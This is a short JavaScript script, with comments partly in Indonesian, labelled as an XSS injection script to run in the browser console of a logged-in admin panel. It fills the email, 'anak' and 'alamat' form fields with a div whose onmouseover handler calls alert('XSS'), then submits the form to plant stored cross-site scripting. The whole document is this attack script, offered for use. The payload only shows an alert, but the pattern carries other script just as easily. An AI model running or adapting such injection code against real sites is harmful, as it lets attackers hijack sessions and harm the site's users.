
// XSS Injection Script
// Run this in browser console saat sudah login ke admin panel

function injectPayload() {
    // Fill form dengan payload
    document.getElementById('email').value = `<div style="width:100%;height:100%" onmouseover="alert('XSS')">Hover me</div>`;
    document.getElementById('anak').value = `<div style="width:100%;height:100%" onmouseover="alert('XSS')">Hover me</div>`;
    document.getElementById('alamat').value = `<div style="width:100%;height:100%" onmouseover="alert('XSS')">Hover me</div>`;
    
    // Submit form
    document.getElementById('myForm').submit();
    
    console.log('[+] Payload injected!');
}

// Execute
injectPayload();
